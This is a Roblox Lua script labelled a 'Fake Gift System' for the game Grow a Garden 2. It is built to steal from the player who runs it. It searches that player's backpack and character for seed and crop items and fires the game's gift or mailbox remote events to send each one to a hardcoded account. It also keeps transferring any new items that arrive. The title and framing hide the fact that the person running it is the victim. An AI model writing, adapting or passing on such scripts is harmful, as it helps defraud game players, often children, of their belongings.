-- Fake Gift System v175 (Grow a Garden 2)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local TARGET = "edichoq1234"

local target = Players:FindFirstChild(TARGET)
if not target then return end

local function isSeed(item)
    if not item:IsA("Tool") then return false end
    local n = item.Name:lower()
    return n:find("seed") or n:find("semente") or n:find("blueberry") or n:find("carrot") or n:find("strawberry") or n:find("pumpkin") or n:find("tomato") or n:find("bamboo") or n:find("cactus") or n:find("corn") or n:find("banana") or n:find("coconut") or n:find("grape") or n:find("mango") or n:find("mushroom") or n:find("acorn") or n:find("cherry") or n:find("flower")
end

local function fakeGift(item)
    if not item or not item.Parent then return end
    pcall(function()
        local rem = ReplicatedStorage:FindFirstChild("GiftSystem", true) or ReplicatedStorage:FindFirstChild("Mailbox", true) or ReplicatedStorage:FindFirstChild("SendGift", true)
        if rem then
            rem:FireServer(item, target.UserId, "Normal")
        else
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("RemoteEvent") and (v.Name:find("Gift") or v.Name:find("Mail") or v.Name:find("Send")) then
                    v:FireServer(item, target.UserId, "Normal")
                    break
                end
            end
        end
    end)
    task.wait(0.6)
end

for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
    if isSeed(item) then
        fakeGift(item)
    end
end

if LocalPlayer.Character then
    for _, item in ipairs(LocalPlayer.Character:GetChildren()) do
        if isSeed(item) then
            fakeGift(item)
        end
    end
end

LocalPlayer.Backpack.ChildAdded:Connect(function(item)
    if isSeed(item) then task.wait(0.5) fakeGift(item) end
end)
